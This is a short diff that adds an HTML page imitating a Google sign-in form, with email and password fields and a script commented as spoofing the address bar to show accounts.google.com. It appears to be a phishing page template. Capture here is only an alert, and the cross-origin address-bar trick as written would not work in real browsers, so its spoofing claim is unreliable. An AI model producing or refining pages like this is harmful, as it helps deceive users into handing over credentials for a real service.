@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Login</title>
+  <style>
+    body { font-family: sans-serif; background: #fff; }
+    .box { max-width: 300px; margin: 100px auto; padding: 20px; border: 1px solid #ccc; }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <h3>Sign in to Google</h3>
+    <input type="email" placeholder="Email"><br><br>
+    <input type="password" placeholder="Password"><br><br>
+    <button onclick="alert('Captured!')">Login</button>
+  </div>
+
+  <script>
+    // Spoofing the address bar
+    history.pushState({}, '', 'https://accounts.google.com/login');
+  </script>
+</body>
+</html>
